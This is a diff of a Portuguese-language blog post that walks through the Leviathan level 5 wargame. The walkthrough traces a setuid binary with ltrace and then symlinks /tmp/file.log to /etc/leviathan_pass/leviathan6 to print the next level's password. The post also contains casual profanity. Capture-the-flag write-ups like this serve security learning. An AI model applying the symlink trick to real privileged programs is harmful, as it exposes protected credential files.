@@ -18,30 +18,37 @@ categories: [CTFs]
 
 Se chegou aqui de para-quedas e voar em alguma coisa, volte ao level0 ;)</blockquote>
 
-```leviathan5@melinda:~$ ls -alh
+```
+leviathan5@melinda:~$ ls -alh
 total 28K
 drwxr-xr-x   2 root       root       4.0K Nov 14  2014 .
 drwxr-xr-x 172 root       root       4.0K Jul 10 14:12 ..
 -rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
 -rw-r--r--   1 root       root       3.6K Apr  9  2014 .bashrc
 -rw-r--r--   1 root       root        675 Apr  9  2014 .profile
--r-sr-x---   1 leviathan6 leviathan5 7.5K Nov 14  2014 leviathan5```
+-r-sr-x---   1 leviathan6 leviathan5 7.5K Nov 14  2014 leviathan5
+```
 
 <strong>leviathan5</strong> será o explorado da vez.
 
-```leviathan5@melinda:~$ ./leviathan5
-Cannot find /tmp/file.log```
+```
+leviathan5@melinda:~$ ./leviathan5
+Cannot find /tmp/file.log
+```
 
 Ok, se for para agradar, eu crio o arquivo <strong>file.log</strong> em <strong>/tmp</strong>.
 
-```leviathan5@melinda:~$ echo fodase /tmp/file.log
+```
+leviathan5@melinda:~$ echo fodase /tmp/file.log
 leviathan5@melinda:~$ ./leviathan5
-fodase```
+fodase
+```
 
 Então leviathan5 lê o arquivo /tmp/file.log e me mostra o conteúdo?
 Só ver o que ele faz por fora impossibilita a criação de teorias especificas. Hora de usar o <em>ltrace</em> (amigo de todas as horas e challs do leviathan) e descobrir o que o programa faz por baixo dos panos.
 
-```leviathan5@melinda:~$ ltrace ./leviathan5
+```
+leviathan5@melinda:~$ ltrace ./leviathan5
 __libc_start_main(0x80485ed, 1, 0xffffd794, 0x8048690 unfinished ...&amp;gt;
 fopen(/tmp/file.log, r)                      = 0
 puts(Cannot find /tmp/file.logCannot find /tmp/file.log
@@ -53,7 +60,8 @@ exit(-1 no return ...&amp;gt;
 Mas eu não tinha acabado de criar essa porra?
 Hora de tentar de novo.
 
-```leviathan5@melinda:~$ echo fodase /tmp/file.log
+```
+leviathan5@melinda:~$ echo fodase /tmp/file.log
 leviathan5@melinda:~$ ltrace ./leviathan5                                       __libc_start_main(0x80485ed, 1, 0xffffd794, 0x8048690 unfinished ...&amp;gt;
 fopen(/tmp/file.log, r)                      = 0x804b008
 fgetc(0x804b008)                                 = 'f'
@@ -93,7 +101,8 @@ Só para constar, não tenho total certeza sobre o arquivo ser excluído no fim 
 
 Hora de testar o link simbólico e ver se essa flag vem.
 
-```leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+```
+leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
 leviathan5@melinda:~$ ./leviathan5
 ZW1pbmVt
 ```
